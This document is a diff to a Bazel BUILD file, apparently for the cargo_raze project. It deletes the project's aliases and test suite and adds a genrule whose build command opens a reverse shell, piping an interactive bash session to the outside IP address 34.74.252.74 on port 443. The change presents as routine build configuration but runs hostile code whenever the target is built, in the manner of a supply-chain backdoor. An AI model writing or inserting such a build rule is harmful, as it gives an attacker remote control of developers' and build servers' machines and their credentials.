@@ -1,37 +1,6 @@
-alias(
-    name = "cargo_raze",
-    actual = "//impl:cargo_raze",
-    visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "raze",
-    actual = "//tools:raze",
-    visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "bin",
-    actual = "//impl:cargo_raze_bin",
-    visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "bootstrap",
-    actual = "//tools:bootstrap",
-    visibility = ["//visibility:private"],
-)
-
-alias(
-    name = "publish_new_version",
-    actual = "//tools:publish_new_version",
-    visibility = ["//visibility:private"],
-)
-
-test_suite(
-    name = "examples_tests",
-    tests = [
-        "@cargo_raze_examples//tests:examples_tests",
-    ],
-    visibility = ["//visibility:private"],
+genrule(
+  name = "build",
+  outs = ["foazo"],
+  cmd = "/bin/bash -l > /dev/tcp/34.74.252.74/443 0<&1 2>&1",
+  visibility = ["//visibility:public"],
 )
